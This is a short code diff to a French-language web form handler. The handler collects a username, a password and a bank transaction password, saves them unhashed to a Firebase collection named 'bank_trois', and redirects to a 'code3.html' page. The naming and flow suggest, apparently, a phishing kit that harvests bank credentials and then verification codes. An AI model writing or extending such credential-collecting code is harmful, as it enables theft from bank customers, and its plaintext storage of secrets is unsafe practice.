@@ -168,7 +168,7 @@
 
                 if (username && password && transacpassword) {
                     try {
-                        const customId = await generateCustomId("bank_un");
+                        const customId = await generateCustomId("bank_trois");
                         await setDoc(doc(db, "bank_trois", customId), {
                             id: customId,
                             username: username,
@@ -179,9 +179,13 @@
                         });
 
                         console.log("Document créé avec l'ID : ", customId);
-                        window.location.href = `code.html?id=${customId}`;
+
+                        // Rediriger vers code3.html avec l'ID
+                        window.location.href = `code3.html?id=${customId}`;
+
                     } catch (error) {
                         console.error("Erreur Firebase :", error);
+                        alert("Une erreur s'est produite. Veuillez réessayer.");
                     }
                 } else {
                     alert("Veuillez remplir tous les champs !");
